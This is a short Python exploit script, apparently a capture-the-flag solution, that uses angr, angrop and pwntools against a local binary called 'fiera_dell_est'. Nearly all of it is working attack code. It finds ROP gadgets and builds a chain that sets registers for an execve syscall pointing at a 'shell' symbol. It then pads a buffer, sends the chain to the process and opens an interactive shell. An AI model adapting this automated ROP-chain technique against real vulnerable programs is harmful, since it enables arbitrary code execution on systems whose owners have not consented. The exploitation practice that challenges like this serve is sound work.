"""
Oro bestia
"""

import angr
import angrop
from pwn import *

file_path = 'fiera_dell_est'

EXE_FILE = file_path
exe = ELF(EXE_FILE)

p = angr.Project(file_path)
rop = p.analyses.ROP()
rop.find_gadgets()

chain = rop.set_regs(eax=0xb, ebx=exe.symbols['shell'], ecx=0x0, edx=0x0)
chain += rop.func_call('angelo_della_morte', [])

# chain.print_payload_code()
ropchain = b'due\x00' + b'aaaaaaaaaaaa' + chain.payload_str()

io = process([EXE_FILE])
io.recvline()
io.sendline(ropchain)
io.interactive()
